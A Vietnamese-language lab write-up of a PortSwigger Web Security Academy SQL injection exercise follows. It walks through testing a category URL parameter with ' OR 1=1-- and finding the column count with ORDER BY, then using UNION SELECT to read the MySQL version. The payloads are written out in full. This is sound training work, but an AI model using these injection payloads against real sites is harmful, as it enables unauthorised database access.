![[Pasted image 20260603133157.png]]
# Tổng quan về lab
-Đầu tiên ta truy cập vào lab sử dụng các chứng năng như một client.Khi bấm vào mục Gifts thì ta thấy ở url:
```LINK
https://0ad0005f045ee806809e5847006d00e0.web-security-academy.net/filter?category=Gifts
```
 Phần `category=Gifts` rất có mùi của SQLi ta thử thêm `' OR 1=1--` rồi dùng URL encode:
 ```Link
 https://0ad0005f045ee806809e5847006d00e0.web-security-academy.net/filter?category=Gifts'+OR+1=1--
 ```
![[Pasted image 20260603134603.png]]
Nhưng lại gặp lỗi....
Ta cùng đọc lại description của lab và nhận ra lab dùng database là MySQL hoặc là SQLServer,nhưng khi ta học MySQL ta biết một điều rằng `--` phải thêm 1 dấu cách thì nó mới hiểu là comment,còn với SQLServer thì `--` không cần cách thêm một dấu cách để nó hiểu là comment vậy nên trang web đang sử dụng DBMS là MySQL vì vậy ta thêm dấu + vào sau url để trang web hiểu là ta đang thêm 1 ký tự trắng để cho những phần sau `--` thành comment
```LINK
 https://0ad0005f045ee806809e5847006d00e0.web-security-academy.net/filter?category=Gifts'+OR+1=1--+
```
![[Pasted image 20260603135153.png]]
=> nó đã hiện hết các danh mục với OR 1=1 vậy nên 100% SQLi
Mục tiêu của lab là khiến cho database hiển thị ra phiên bản
# Khai thác
-Đầu tiên ta phải xác định số cột của câu truy vấn trước bằng `ORDER BY 1,2,3,...--`
```LINK
https://0ad0005f045ee806809e5847006d00e0.web-security-academy.net/filter?category=Gifts%27+ORDER+BY+1--+
https://0ad0005f045ee806809e5847006d00e0.web-security-academy.net/filter?category=Gifts%27+ORDER+BY+2--+
```
cho đến khi `ORDER BY 3--` server gặp lỗi ***Internal Server Error*** 
=>câu truy vấn trước đã dùng 2 cột 
=>`UNION SELECT` sẽ dùng 2 cột 
Ta xác định là cột của câu truy vấn trước,với lần thử cho chuỗi vào từng cột:
```LINK
https://0ad0005f045ee806809e5847006d00e0.web-security-academy.net/filter?category=Gifts%27+UNION+SELECT+%27abc%27,%27xyz%27--+
```
![[Pasted image 20260603140203.png]]
=> cột của cả 2 là thuộc dạng text vậy thì ta có thể dùng NULL,@@version vô tư:
```SQL
' UNION SELECT NULL,@@version--
```
![[Pasted image 20260603140434.png]]
=> Solved 